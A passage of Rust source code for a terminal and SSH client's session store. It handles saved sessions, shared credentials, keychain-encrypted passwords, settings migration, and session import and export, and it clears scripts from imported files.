// SPDX-License-Identifier: GPL-2.0-or-later
// Copyright (C) 2026 Gabriel Moreno and contributors
//! Saved sessions, folders, shared credentials, settings and known hosts (JSON files in the
//! user's private data folder), with passwords encrypted by the OS keychain.

use crate::json::{arr, at, num_or, obj_mut, set, str_at, string, truthy};
use crate::safe_storage::SecretBox;
use crate::security::{is_unsafe_key, safe_json_parse};
use crate::util::{home, new_id};
use anyhow::{Result, anyhow, bail};
use base64::Engine;
use serde_json::{Map, Value, json};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Arc;

const SECRET_FIELDS: [&str; 2] = ["password", "passphrase"];
pub const KEYCHAIN_DENIED: &str = "TermCraft could not use the system keychain to encrypt your login (access was denied). Quit and reopen TermCraft, then choose \"Always Allow\" when asked about \"TermCraft Safe Storage\".";

fn has_key(f: &str) -> String {
    format!("has{}{}", f[..1].to_uppercase(), &f[1..])
}

pub fn default_session() -> Value {
    json!({
        "protocol": "ssh2",
        "host": "",
        "port": 22,
        "username": "",
        // credentialId: use a shared login from the Credentials list instead of this session's own.
        // autoLogin: answer Username:/Password: prompts on Telnet, Rlogin and Serial connections.
        "auth": { "methods": ["publickey", "keyboard-interactive", "password"], "keyFile": "", "useAgent": true, "savePassword": true, "credentialId": "", "autoLogin": true },
        "ssh": { "keepAlive": 30, "compression": false, "agentForward": false, "x11": false, "jumpSessionId": "", "trace": false, "readyTimeout": 20 },
        "forwards": [],
        "terminal": {
            "termType": "xterm-256color", "scrollback": 10000, "encoding": "utf-8", "backspace": "del",
            "colorScheme": "", "fontFamily": "", "fontSize": 0, "cursorStyle": "block", "cursorBlink": true,
            "useRemoteTitle": false,
            "tabColor": ""
        },
        "logging": { "enabled": false, "path": "~/TermCraft Logs/%S-%Y%M%D-%h%m%s.log", "timestamps": false, "append": true, "stripAnsi": true },
        "logonActions": [],
        "logonScript": "",
        "antiIdle": { "enabled": false, "string": "\\r", "interval": 300 },
        "reconnect": { "enabled": false, "delay": 5 },
        "serial": { "path": "", "baudRate": 9600, "dataBits": 8, "stopBits": 1, "parity": "none", "flowControl": "none" },
        "local": { "shell": "", "args": "", "cwd": "" },
        // VNC (embedded noVNC viewer) and RDP (system client) options.
        "vnc": { "viewOnly": false, "scale": "fit", "quality": 6, "compression": 2, "shared": true },
        "rdp": { "fullscreen": false, "width": 1600, "height": 1000, "multimon": false, "admin": false, "domain": "" },
        // Reticulum shell (rnsh): `host` is the destination hash.
        "reticulum": { "identity": "", "timeout": 30, "noId": false, "command": "" },
        // VNC/RDP: reach the host through this saved SSH session (an SSH tunnel).
        "tunnel": { "sshSessionId": "" },
        "notes": ""
    })
}

fn default_button_bars() -> Value {
    json!([
        {
            "id": "default", "name": "Default", "buttons": [
                { "label": "ls -la", "action": "send", "value": "ls -la\\r", "tooltip": "List files" },
                { "label": "df -h", "action": "send", "value": "df -h\\r", "tooltip": "Disk usage" },
                { "label": "top", "action": "send", "value": "top\\r" },
                { "label": "uptime", "action": "send", "value": "uptime\\r" },
                { "label": "Ctrl-C", "action": "send", "value": "\\x03", "tooltip": "Interrupt", "color": "red" }
            ]
        },
        {
            "id": "network", "name": "Network Devices", "buttons": [
                { "label": "term len 0", "action": "send", "value": "terminal length 0\\r" },
                { "label": "show ver", "action": "send", "value": "show version\\r" },
                { "label": "int brief", "action": "send", "value": "show ip interface brief\\r" },
                { "label": "show run", "action": "send", "value": "show running-config\\r" },
                { "label": "show vlan…", "action": "send", "value": "show vlan id ${prompt:VLAN ID}\\r", "tooltip": "Asks for the VLAN ID" },
                { "label": "wr mem", "action": "send", "value": "write memory\\r", "color": "orange" }
            ]
        },
        {
            "id": "tools", "name": "Tools", "buttons": [
                { "label": "SFTP", "action": "menu", "value": "sftpTab", "tooltip": "Open an SFTP tab for this session" },
                { "label": "Log", "action": "menu", "value": "toggleLog", "tooltip": "Start/stop logging" },
                { "label": "Clear", "action": "menu", "value": "clearScrollback" },
                { "label": "Reconnect", "action": "menu", "value": "reconnect" }
            ]
        }
    ])
}

pub fn default_settings() -> Value {
    json!({
        "theme": "system",
        "lineHeight": "1.15",
        "terminalPadding": "comfortable",
        "copyOnSelect": true,
        "rightClickPaste": true,
        "confirmMultilinePaste": true,
        "pasteLineDelay": 0,
        "confirmCloseConnected": true,
        "fontFamily": "\"JetBrains Mono\", \"Cascadia Mono\", Menlo, Consolas, \"DejaVu Sans Mono\", monospace",
        "fontSize": 14,
        "showSessionManager": true,
        "showButtonBar": true,
        "showCommandWindow": false,
        "bufferMode": "command",
        "bufferPosition": "bottom",
        "bufferText": "",
        "showStatusBar": true,
        "tabActivityIndicator": true,
        "layout": "tabs",
        // Named button bars. Each button: { label, action, value, tooltip, color }.
        // Actions: send, sendAll, script, connect, menu, run.
        "buttonBars": default_button_bars(),
        "activeButtonBar": "default",
        "highlights": [
            { "pattern": "error", "regex": false, "caseSensitive": false, "color": "#ff5555", "bold": true, "enabled": true },
            { "pattern": "fail(ed|ure)?", "regex": true, "caseSensitive": false, "color": "#ff5555", "bold": true, "enabled": true },
            { "pattern": "warn(ing)?", "regex": true, "caseSensitive": false, "color": "#f1c40f", "bold": true, "enabled": true },
            { "pattern": "\\b(up|ok|success)\\b", "regex": true, "caseSensitive": false, "color": "#50fa7b", "bold": false, "enabled": true }
        ],
        "keymap": [],
        "defaultSession": default_session(),
        "windowBounds": null,
        "recentScripts": [],
        "rdpClient": "",
        "zmodemAutoStart": true,
        "inlineImages": true,
        // Reticulum (RNS) tools: off unless turned on in Settings → General.
        "reticulum": { "enabled": false, "binDir": "", "configDir": "", "identity": "" }
    })
}

/// Merge `over` into `base`: objects recursively, everything else (arrays included) replaced.
pub fn deep_merge(base: &Value, over: Option<&Value>) -> Value {
    let Some(over) = over else { return base.clone() };
    match (base, over) {
        (_, Value::Array(_)) | (Value::Array(_), _) => over.clone(),
        (Value::Object(b), Value::Object(o)) => {
            let mut out = b.clone();
            for (k, v) in o {
                if is_unsafe_key(k) {
                    continue;
                }
                let merged = match b.get(k) {
                    Some(bv) => deep_merge(bv, Some(v)),
                    None => deep_merge(&Value::Null, Some(v)),
                };
                out.insert(k.clone(), merged);
            }
            Value::Object(out)
        }
        _ => over.clone(),
    }
}

pub struct Store {
    pub dir: PathBuf,
    pub sessions_file: PathBuf,
    settings_file: PathBuf,
    known_hosts_file: PathBuf,
    data: Value,
    settings: Value,
    known_hosts: Value,
    secrets: Option<Arc<dyn SecretBox>>,
}

fn read_json(file: &Path) -> Option<Value> {
    fs::read_to_string(file).ok().and_then(|t| safe_json_parse(&t).ok())
}

/// Write a file only the user can read (0600), atomically.
pub fn write_private(file: &Path, text: &str) -> Result<()> {
    let tmp = PathBuf::from(format!("{}.tmp", file.display()));
    write_mode(&tmp, text.as_bytes(), 0o600)?;
    fs::rename(&tmp, file)?;
    Ok(())
}

pub fn write_mode(file: &Path, data: &[u8], mode: u32) -> Result<()> {
    #[cfg(unix)]
    {
        use std::io::Write;
        use std::os::unix::fs::{OpenOptionsExt, PermissionsExt};
        let mut f = fs::OpenOptions::new().write(true).create(true).truncate(true).mode(mode).open(file)?;
        f.write_all(data)?;
        let _ = fs::set_permissions(file, fs::Permissions::from_mode(mode));
    }
    #[cfg(not(unix))]
    {
        let _ = mode;
        fs::write(file, data)?;
    }
    Ok(())
}

pub fn mkdir_private(dir: &Path) -> std::io::Result<()> {
    #[cfg(unix)]
    {
        use std::os::unix::fs::DirBuilderExt;
        fs::DirBuilder::new().recursive(true).mode(0o700).create(dir)
    }
    #[cfg(not(unix))]
    fs::create_dir_all(dir)
}

impl Store {
    pub fn new(dir: &Path, secrets: Option<Arc<dyn SecretBox>>) -> Result<Store> {
        // Sessions, settings and known hosts are private to the user.
        mkdir_private(dir)?;
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = fs::set_permissions(dir, fs::Permissions::from_mode(0o700));
        }
        let sessions_file = dir.join("sessions.json");
        let settings_file = dir.join("settings.json");
        let known_hosts_file = dir.join("known_hosts.json");
        let mut data = read_json(&sessions_file).filter(Value::is_object).unwrap_or_else(|| json!({ "folders": [], "sessions": [], "credentials": [] }));
        for k in ["folders", "sessions", "credentials"] {
            if !data[k].is_array() {
                data[k] = json!([]);
            }
        }
        let raw_settings = read_json(&settings_file).filter(Value::is_object).unwrap_or_else(|| json!({}));
        let settings = deep_merge(&default_settings(), Some(&Self::migrate_settings(raw_settings)));
        let known_hosts = read_json(&known_hosts_file).filter(Value::is_object).unwrap_or_else(|| json!({}));
        let mut store = Store { dir: dir.to_path_buf(), sessions_file, settings_file, known_hosts_file, data, settings, known_hosts, secrets };
        // Sessions saved with the old fixed default scheme now follow the app theme.
        for s in store.sessions_mut() {
            if at(s, &["terminal", "colorScheme"]) == "TermCraft Dark" {
                s["terminal"]["colorScheme"] = json!("");
            }
        }
        Ok(store)
    }

    /// Older versions had one flat `buttons` list; keep those as a "Default" button bar.
    fn migrate_settings(mut raw: Value) -> Value {
        // 'TermCraft Dark' used to be the fixed default terminal scheme; now the default follows the app theme.
        if at(&raw, &["defaultSession", "terminal", "colorScheme"]) == "TermCraft Dark" {
            raw["defaultSession"]["terminal"]["colorScheme"] = json!("");
        }
        if raw["theme"] == "dark" {
            raw["theme"] = json!("TermCraft Dark");
        }
        if raw["theme"] == "light" {
            raw["theme"] = json!("TermCraft Light");
        }
        if raw["buttons"].is_array() && raw.get("buttonBars").is_none_or(|b| !truthy(b)) {
            let mut bars = vec![json!({ "id": "default", "name": "Default", "buttons": raw["buttons"].clone() })];
            bars.extend(arr(&default_button_bars()).iter().filter(|b| b["id"] != "default").cloned());
            raw["buttonBars"] = Value::Array(bars);
            raw["activeButtonBar"] = json!("default");
        }
        if let Some(m) = raw.as_object_mut() {
            m.remove("buttons");
        }
        raw
    }

    fn write(&self, which: &str) -> Result<()> {
        let (file, v) = match which {
            "sessions" => (&self.sessions_file, &self.data),
            "settings" => (&self.settings_file, &self.settings),
            _ => (&self.known_hosts_file, &self.known_hosts),
        };
        write_private(file, &serde_json::to_string_pretty(v)?)
    }

    fn list(&self, k: &str) -> &Vec<Value> {
        self.data[k].as_array().unwrap()
    }
    fn list_mut(&mut self, k: &str) -> &mut Vec<Value> {
        self.data[k].as_array_mut().unwrap()
    }
    fn sessions_mut(&mut self) -> &mut Vec<Value> {
        self.list_mut("sessions")
    }

    // ---- secrets -------------------------------------------------------
    pub fn encrypt(&self, plain: &str) -> Result<String> {
        if plain.is_empty() {
            return Ok(String::new());
        }
        let b64 = base64::engine::general_purpose::STANDARD;
        let keychain_os = cfg!(any(target_os = "macos", windows));
        if let Some(sb) = &self.secrets {
            if sb.is_available() {
                return match sb.encrypt(plain) {
                    Ok(ct) => Ok(format!("enc:{}", b64.encode(ct))),
                    Err(_) => Err(anyhow!(KEYCHAIN_DENIED)),
                };
            }
            // macOS/Windows always have a keychain: if it is unavailable, access was denied — never
            // silently fall back to weaker storage there. (Linux without a keyring uses the
            // fallback, and the UI warns about it.)
            if keychain_os {
                bail!(KEYCHAIN_DENIED);
            }
        }
        Ok(format!("b64:{}", b64.encode(plain.as_bytes())))
    }

    pub fn decrypt(&self, stored: &str) -> String {
        let b64 = base64::engine::general_purpose::STANDARD;
        if let Some(rest) = stored.strip_prefix("enc:") {
            let Some(sb) = &self.secrets else { return String::new() };
            return b64.decode(rest).ok().and_then(|ct| sb.decrypt(&ct).ok()).unwrap_or_default();
        }
        if let Some(rest) = stored.strip_prefix("b64:") {
            return b64.decode(rest).ok().map(|b| String::from_utf8_lossy(&b).into_owned()).unwrap_or_default();
        }
        stored.to_string()
    }

    pub fn encryption_available(&self) -> bool {
        self.secrets.as_ref().is_some_and(|s| s.is_available())
    }

    /// Whether any saved login is encrypted with the OS keychain.
    pub fn has_encrypted_secrets(&self) -> bool {
        let auths = self.list("sessions").iter().map(|s| &s["auth"]).chain(self.list("credentials").iter());
        auths.into_iter().any(|a| SECRET_FIELDS.iter().any(|f| str_at(a, &[f]).starts_with("enc:")))
    }

    /// When saved logins exist, check that the OS keychain can be used (on macOS this is when the
    /// "TermCraft Safe Storage" prompt appears). Returns 'none' | 'ok' | 'denied'.
    pub fn check_keychain(&self) -> &'static str {
        let auths = self.list("sessions").iter().map(|s| &s["auth"]).chain(self.list("credentials").iter());
        let has = auths.into_iter().any(|a| SECRET_FIELDS.iter().any(|f| str_at(a, &[f]).starts_with("enc:")));
        let Some(sb) = &self.secrets else { return "none" };
        if !has {
            return "none";
        }
        if !sb.is_available() {
            return "denied";
        }
        if sb.encrypt("termcraft-keychain-check").is_ok() { "ok" } else { "denied" }
    }

    // ---- settings ------------------------------------------------------
    pub fn settings(&self) -> &Value {
        &self.settings
    }

    pub fn save_settings(&mut self, patch: &Value) -> Result<Value> {
        self.settings = deep_merge(&self.settings, Some(patch));
        self.write("settings")?;
        Ok(self.settings.clone())
    }

    // ---- sessions ------------------------------------------------------
    /// Session tree with secrets replaced by has* flags, safe to send to the page.
    pub fn tree(&self) -> Value {
        json!({
            "folders": self.data["folders"].clone(),
            "sessions": self.list("sessions").iter().map(|s| self.sanitize(s)).collect::<Vec<_>>(),
            "credentials": self.list("credentials").iter().map(|c| self.sanitize_credential(c)).collect::<Vec<_>>(),
        })
    }

    fn sanitize(&self, s: &Value) -> Value {
        let mut out = s.clone();
        let auth = obj_mut(&mut out, "auth");
        for f in SECRET_FIELDS {
            let has = truthy(at(s, &["auth", f]));
            auth.insert(has_key(f), json!(has));
            auth.remove(f);
        }
        out
    }

    pub fn session(&self, id: &str) -> Option<&Value> {
        self.list("sessions").iter().find(|s| s["id"] == id)
    }

    fn session_mut(&mut self, id: &str) -> Option<&mut Value> {
        self.sessions_mut().iter_mut().find(|s| s["id"] == id)
    }

    pub fn find_session_by_name(&self, name: &str) -> Option<&Value> {
        self.list("sessions").iter().find(|s| s["name"] == name || s["id"] == name)
    }

    /// Full session config with defaults applied and secrets decrypted (backend only).
    /// `r` is a saved session id or an ad-hoc session object.
    pub fn resolve_session(&self, r: &Value) -> Result<Value> {
        let raw = match r {
            Value::String(id) => self.session(id).cloned(),
            Value::Object(_) => Some(r.clone()),
            _ => None,
        }
        .ok_or_else(|| anyhow!("Session not found"))?;
        let defaults = if truthy(&self.settings["defaultSession"]) { self.settings["defaultSession"].clone() } else { default_session() };
        let mut s = deep_merge(&defaults, Some(&raw));
        obj_mut(&mut s, "auth");
        // Stored sessions keep encrypted secrets; ad-hoc (quick connect) sessions carry plaintext ones.
        let stored = raw.get("id").and_then(|i| i.as_str()).filter(|i| !i.is_empty()).and_then(|id| self.session(id));
        for f in SECRET_FIELDS {
            let v = match stored {
                Some(st) => self.decrypt(&str_at(st, &["auth", f])),
                None => str_at(&raw, &["auth", f]),
            };
            s["auth"][f] = json!(v);
        }
        // A shared credential supplies the login; the session's own values fill any gaps.
        let cred_id = str_at(&s, &["auth", "credentialId"]);
        if let Some(cred) = (!cred_id.is_empty()).then(|| self.credential(&cred_id)).flatten() {
            let user = str_at(cred, &["username"]);
            if !user.is_empty() {
                s["username"] = json!(user);
            }
            let key = str_at(cred, &["keyFile"]);
            if !key.is_empty() {
                s["auth"]["keyFile"] = json!(key);
            }
            for f in SECRET_FIELDS {
                let v = self.decrypt(&str_at(cred, &[f]));
                if !v.is_empty() {
                    s["auth"][f] = json!(v);
                }
            }
            s["auth"]["credentialName"] = cred["name"].clone();
        }
        Ok(s)
    }

    // ---- shared credentials ----------------------------------------------
    /// A login (username + password and/or key) shared by many sessions, e.g. a TACACS or AD account.
    pub fn credential(&self, id: &str) -> Option<&Value> {
        self.list("credentials").iter().find(|c| c["id"] == id)
    }

    fn sanitize_credential(&self, c: &Value) -> Value {
        let mut out = c.clone();
        let m = out.as_object_mut().unwrap();
        for f in SECRET_FIELDS {
            m.insert(has_key(f), json!(truthy(&c[f])));
            m.remove(f);
        }
        let used = self.list("sessions").iter().filter(|s| at(s, &["auth", "credentialId"]) == &c["id"]).count();
        m.insert("usedBy".into(), json!(used));
        out
    }

    /// Insert/update a credential. Secrets: absent keeps, '' clears, a string replaces.
    pub fn save_credential(&mut self, cred: &Value) -> Result<Value> {
        let id = str_at(cred, &["id"]);
        let existing = (!id.is_empty()).then(|| self.credential(&id).cloned()).flatten();
        let pick = |k: &str| -> String {
            match cred.get(k) {
                Some(v) if !v.is_null() => string(v),
                _ => existing.as_ref().map(|e| str_at(e, &[k])).unwrap_or_default(),
            }
        };
        let name = pick("name").trim().to_string();
        let username = pick("username");
        let mut next = json!({
            "id": existing.as_ref().map(|e| e["id"].clone()).unwrap_or_else(|| json!(new_id("c_"))),
            "name": if name.is_empty() { if string(&cred["username"]).is_empty() { "Login".to_string() } else { string(&cred["username"]) } } else { name },
            "username": username,
            "keyFile": pick("keyFile"),
            "notes": pick("notes"),
        });
        for f in SECRET_FIELDS {
            next[f] = match cred.get(f) {
                None | Some(Value::Null) => json!(existing.as_ref().map(|e| str_at(e, &[f])).unwrap_or_default()),
                Some(v) => json!(self.encrypt(&string(v))?),
            };
        }
        let list = self.list_mut("credentials");
        let saved = match list.iter_mut().find(|c| c["id"] == next["id"]) {
            Some(e) => {
                for (k, v) in next.as_object().unwrap() {
                    e[k] = v.clone();
                }
                e.clone()
            }
            None => {
                list.push(next.clone());
                next
            }
        };
        self.write("sessions")?;
        Ok(self.sanitize_credential(&saved))
    }

    /// Delete a credential; sessions that used it fall back to their own login.
    pub fn delete_credential(&mut self, id: &str) -> Result<()> {
        self.list_mut("credentials").retain(|c| c["id"] != id);
        for s in self.sessions_mut() {
            if at(s, &["auth", "credentialId"]) == id {
                s["auth"]["credentialId"] = json!("");
            }
        }
        self.write("sessions")
    }

    /// Insert/update a session. For secret fields: absent keeps the stored value, '' clears it,
    /// any other string replaces it.
    pub fn save_session(&mut self, session: &Value) -> Result<Value> {
        let mut next = session.clone();
        if !next.is_object() {
            bail!("Invalid session");
        }
        crate::security::sanitize_json(&mut next);
        let id = str_at(&next, &["id"]);
        let existing = (!id.is_empty()).then(|| self.session(&id).cloned()).flatten();
        {
            let auth = obj_mut(&mut next, "auth");
            auth.remove("hasPassword");
            auth.remove("hasPassphrase");
        }
        for f in SECRET_FIELDS {
            let v = match next["auth"].get(f) {
                None | Some(Value::Null) => json!(existing.as_ref().map(|e| str_at(e, &["auth", f])).unwrap_or_default()),
                Some(v) => json!(self.encrypt(&string(v))?),
            };
            next["auth"][f] = v;
        }
        if next["auth"]["savePassword"] == false {
            next["auth"]["password"] = json!("");
        }
        let saved = if existing.is_some() {
            let e = self.session_mut(&id).unwrap();
            for (k, v) in next.as_object().unwrap() {
                e[k] = v.clone();
            }
            e.clone()
        } else {
            if id.is_empty() {
                next["id"] = json!(new_id("s_"));
            }
            self.sessions_mut().push(next.clone());
            next
        };
        self.write("sessions")?;
        Ok(self.sanitize(&saved))
    }

    /// Remember a login the user chose to save at the prompt. Updates the stored session, or —
    /// for an ad-hoc (quick connect) session — creates a saved session from it.
    pub fn save_credentials(&mut self, r: &Value, creds: &Value) -> Result<Value> {
        let stored = match r {
            Value::String(id) => self.session(id).cloned(),
            Value::Object(_) => r.get("id").and_then(|i| i.as_str()).and_then(|id| self.session(id).cloned()),
            _ => None,
        };
        // A session using a shared credential updates that credential, so every device using it
        // gets the new password (e.g. after a TACACS/AD password change).
        let shared = stored.as_ref().map(|s| str_at(s, &["auth", "credentialId"])).filter(|c| !c.is_empty()).and_then(|c| self.credential(&c).cloned());
        if let Some(shared) = shared {
            let mut patch = json!({ "id": shared["id"] });
            if truthy(&creds["username"]) {
                patch["username"] = creds["username"].clone();
            }
            for f in SECRET_FIELDS {
                if let Some(v) = creds.get(f).filter(|v| !v.is_null()) {
                    patch[f] = v.clone();
                }
            }
            self.save_credential(&patch)?;
            return Ok(self.sanitize(stored.as_ref().unwrap()));
        }
        let mut base = stored.clone().unwrap_or_else(|| r.clone());
        if !base.is_object() {
            bail!("Session not found");
        }
        {
            let auth = obj_mut(&mut base, "auth");
            // save_session treats absent secrets as "keep stored value"; only pass the new ones.
            for f in SECRET_FIELDS {
                auth.remove(f);
            }
        }
        if stored.is_none() {
            base.as_object_mut().unwrap().remove("id");
            if !truthy(&base["name"]) {
                let user = string(&creds["username"]);
                base["name"] = json!(format!("{}{}", if user.is_empty() { String::new() } else { format!("{user}@") }, string(&base["host"])));
            }
            if !truthy(&base["parent"]) {
                base["parent"] = json!("");
            }
        }
        if truthy(&creds["username"]) {
            base["username"] = creds["username"].clone();
        }
        if let Some(p) = creds.get("password").filter(|v| !v.is_null()) {
            base["auth"]["password"] = p.clone();
            base["auth"]["savePassword"] = json!(true);
        }
        if let Some(p) = creds.get("passphrase").filter(|v| !v.is_null()) {
            base["auth"]["passphrase"] = p.clone();
        }
        self.save_session(&base)
    }

    pub fn delete_session(&mut self, id: &str) -> Result<()> {
        self.sessions_mut().retain(|s| s["id"] != id);
        self.write("sessions")
    }

    pub fn save_folder(&mut self, folder: &Value) -> Result<Value> {
        let mut folder = folder.clone();
        crate::security::sanitize_json(&mut folder);
        let id = str_at(&folder, &["id"]);
        let list = self.list_mut("folders");
        let out = match list.iter_mut().find(|f| !id.is_empty() && f["id"] == id) {
            Some(e) => {
                for (k, v) in folder.as_object().into_iter().flatten() {
                    e[k] = v.clone();
                }
                e.clone()
            }
            None => {
                set(&mut folder, "id", json!(if id.is_empty() { new_id("f_") } else { id }));
                list.push(folder.clone());
                folder
            }
        };
        self.write("sessions")?;
        Ok(out)
    }

    pub fn delete_folder(&mut self, id: &str) -> Result<()> {
        let mut doomed = std::collections::HashSet::from([id.to_string()]);
        let mut grew = true;
        while grew {
            grew = false;
            for f in self.list("folders") {
                let fid = str_at(f, &["id"]);
                if !doomed.contains(&fid) && doomed.contains(&str_at(f, &["parent"])) {
                    doomed.insert(fid);
                    grew = true;
                }
            }
        }
        self.list_mut("folders").retain(|f| !doomed.contains(&str_at(f, &["id"])));
        self.sessions_mut().retain(|s| !doomed.contains(&str_at(s, &["parent"])));
        self.write("sessions")
    }

    pub fn move_item(&mut self, kind: &str, id: &str, parent: &str) -> Result<()> {
        let key = if kind == "folder" { "folders" } else { "sessions" };
        if !self.list(key).iter().any(|x| x["id"] == id) {
            return Ok(());
        }
        if kind == "folder" {
            // Refuse to move a folder into its own subtree.
            let mut p = parent.to_string();
            let mut guard = 0;
            while !p.is_empty() && guard < 10000 {
                if p == id {
                    return Ok(());
                }
                p = self.list("folders").iter().find(|f| f["id"] == p.as_str()).map(|f| str_at(f, &["parent"])).unwrap_or_default();
                guard += 1;
            }
        }
        let item = self.list_mut(key).iter_mut().find(|x| x["id"] == id).unwrap();
        item["parent"] = json!(parent);
        self.write("sessions")
    }

    /// Export sessions. Secrets are exported decrypted only when explicitly requested.
    pub fn export_sessions(&self, include_secrets: bool) -> Value {
        let mut out = self.data.clone();
        for key in ["sessions", "credentials"] {
            for item in out[key].as_array_mut().unwrap() {
                for f in SECRET_FIELDS {
                    let holder = if key == "sessions" { &mut item["auth"] } else { &mut *item };
                    if !holder.is_object() {
                        continue;
                    }
                    let v = if include_secrets { self.decrypt(&str_at(holder, &[f])) } else { String::new() };
                    holder[f] = json!(v);
                }
            }
        }
        let mut m = Map::new();
        m.insert("format".into(), json!("termcraft-sessions"));
        m.insert("version".into(), json!(1));
        for (k, v) in out.as_object().unwrap() {
            m.insert(k.clone(), v.clone());
        }
        Value::Object(m)
    }

    /// Import sessions from an exported file. Session files can come from anyone, so anything
    /// that would run code on this machine when a session is opened (logon scripts, local shell
    /// commands) is removed; the caller is told how many sessions were affected.
    pub fn import_sessions(&mut self, data: &Value, parent_folder_name: &str) -> Result<Value> {
        let root = self.save_folder(&json!({ "name": parent_folder_name, "parent": "" }))?;
        let root_id = str_at(&root, &["id"]);
        let mut cred_map = std::collections::HashMap::new();
        for c in arr(&data["credentials"]) {
            if !c.is_object() || !truthy(&c["id"]) {
                continue;
            }
            let mut patch = json!({ "name": c["name"], "username": c["username"], "keyFile": c["keyFile"], "notes": c["notes"] });
            for f in SECRET_FIELDS {
                if truthy(&c[f]) {
                    patch[f] = json!(string(&c[f]));
                }
            }
            let saved = self.save_credential(&patch)?;
            cred_map.insert(string(&c["id"]), saved["id"].clone());
        }
        let mut id_map = std::collections::HashMap::new();
        for f in arr(&data["folders"]) {
            id_map.insert(string(&f["id"]), new_id("f_"));
        }
        for f in arr(&data["folders"]).to_vec() {
            if !f.is_object() {
                continue;
            }
            let mut copy = f.clone();
            crate::security::sanitize_json(&mut copy);
            copy["id"] = json!(id_map[&string(&f["id"])]);
            let parent = string(&f["parent"]);
            copy["parent"] = json!(if parent.is_empty() { root_id.clone() } else { id_map.get(&parent).cloned().unwrap_or(root_id.clone()) });
            self.list_mut("folders").push(copy);
        }
        let (mut n, mut cleared) = (0, 0);
        for s in arr(&data["sessions"]).to_vec() {
            if !s.is_object() {
                continue;
            }
            let mut copy = s.clone();
            let m = copy.as_object_mut().unwrap();
            m.remove("id");
            let parent = string(&s["parent"]);
            m.insert("parent".into(), json!(if parent.is_empty() { root_id.clone() } else { id_map.get(&parent).cloned().unwrap_or(root_id.clone()) }));
            {
                let auth = obj_mut(&mut copy, "auth");
                for f in SECRET_FIELDS {
                    if !auth.get(f).is_some_and(truthy) {
                        auth.remove(f);
                    }
                }
                let cid = auth.get("credentialId").map(string).unwrap_or_default();
                auth.insert("credentialId".into(), cred_map.get(&cid).cloned().unwrap_or(json!("")));
            }
            // Tool tabs are never sessions.
            if copy["protocol"] == "rntool" {
                continue;
            }
            if truthy(&copy["logonScript"])
                || truthy(at(&copy, &["local", "shell"]))
                || truthy(at(&copy, &["local", "args"]))
                || truthy(at(&copy, &["reticulum", "identity"]))
            {
                cleared += 1;
                copy["logonScript"] = json!("");
                let local = obj_mut(&mut copy, "local");
                local.insert("shell".into(), json!(""));
                local.insert("args".into(), json!(""));
                // A local key file path chosen by whoever wrote the file.
                obj_mut(&mut copy, "reticulum").insert("identity".into(), json!(""));
            }
            self.save_session(&copy)?;
            n += 1;
        }
        self.write("sessions")?;
        Ok(json!({ "count": n, "cleared": cleared }))
    }

    /// Create sessions from parsed host rows (see host_import.rs). Folder paths like "HQ/Core" are
    /// created under `opts.folder` (a folder id, '' = root); credentials and jump hosts are
    /// matched by name.
    pub fn import_hosts(&mut self, rows: &Value, opts: &Value) -> Result<Value> {
        let mut warnings: Vec<String> = Vec::new();
        let (mut created, mut skipped) = (0, 0);
        let mut added: Vec<(String, String)> = Vec::new();
        for r in arr(rows) {
            let host = match r.get("host") {
                Some(Value::String(h)) if !h.is_empty() => h.clone(),
                _ => continue,
            };
            let protocol = if truthy(&r["protocol"]) { string(&r["protocol"]) } else { "ssh2".into() };
            let port = num_or(&r["port"], 22.0);
            if opts["skipExisting"] != false
                && self.list("sessions").iter().any(|x| {
                    x["host"] == host.as_str()
                        && num_or(&x["port"], f64::NAN) == crate::json::number(&r["port"]).unwrap_or(f64::NAN)
                        && x["protocol"] == protocol.as_str()
                })
            {
                skipped += 1;
                continue;
            }
            let mut credential_id = str_at(opts, &["credentialId"]);
            let cname = str_at(r, &["credential"]);
            if !cname.is_empty() {
                match self.list("credentials").iter().find(|c| str_at(c, &["name"]).to_lowercase() == cname.to_lowercase()) {
                    Some(c) => credential_id = str_at(c, &["id"]),
                    None => warnings.push(format!("{}: no credential named \"{cname}\"", string(&r["name"]))),
                }
            }
            let parent = self.folder_for(&str_at(opts, &["folder"]), &str_at(r, &["folder"]));
            let id = new_id("s_");
            let name = if truthy(&r["name"]) { string(&r["name"]) } else { host.clone() };
            self.sessions_mut().push(json!({
                "id": id, "name": name, "protocol": protocol, "host": host,
                "port": port as u64, "username": str_at(r, &["username"]), "parent": parent,
                "auth": { "credentialId": credential_id, "password": "", "passphrase": "" }, "notes": str_at(r, &["notes"]),
            }));
            added.push((id, str_at(r, &["jump"])));
            created += 1;
        }
        for (id, jump) in added {
            if jump.is_empty() {
                continue;
            }
            let j = self
                .list("sessions")
                .iter()
                .find(|x| x["protocol"] == "ssh2" && x["id"] != id.as_str() && (x["name"] == jump.as_str() || x["host"] == jump.as_str()))
                .map(|x| x["id"].clone());
            let s = self.session_mut(&id).unwrap();
            match j {
                Some(jid) => s["ssh"] = json!({ "jumpSessionId": jid }),
                None => {
                    let name = string(&s["name"]);
                    warnings.push(format!("{name}: no SSH session named \"{jump}\" for the jump host"));
                }
            }
        }
        self.write("sessions")?;
        Ok(json!({ "created": created, "skipped": skipped, "warnings": warnings }))
    }

    fn folder_for(&mut self, base: &str, path: &str) -> String {
        let mut parent = base.to_string();
        for part in path.split('/').map(str::trim).filter(|p| !p.is_empty()) {
            let found = self.list("folders").iter().find(|x| str_at(x, &["parent"]) == parent && x["name"] == part).map(|f| str_at(f, &["id"]));
            parent = match found {
                Some(id) => id,
                None => {
                    let id = new_id("f_");
                    let name: String = part.chars().take(200).collect();
                    self.list_mut("folders").push(json!({ "id": id, "name": name, "parent": parent }));
                    id
                }
            };
        }
        parent
    }

    /// Import Host entries from an OpenSSH client config file (~/.ssh/config).
    pub fn import_ssh_config(&mut self, file: Option<&Path>) -> Result<usize> {
        let default = home().join(".ssh").join("config");
        let text = fs::read_to_string(file.unwrap_or(&default))?;
        let line_re = regex::Regex::new(r"^\s*(\w+)\s*=?\s*(.+?)\s*$").unwrap();
        let mut hosts: Vec<(Value, String)> = Vec::new();
        let mut cur: Option<usize> = None;
        for line in text.lines() {
            let Some(m) = line_re.captures(line) else { continue };
            if line.trim().starts_with('#') {
                continue;
            }
            let key = m[1].to_lowercase();
            let val = m[2].trim_start_matches('"').trim_end_matches('"').to_string();
            if key == "host" {
                cur = None;
                for pat in val.split_whitespace() {
                    if pat.contains(['*', '?', '!']) {
                        continue;
                    }
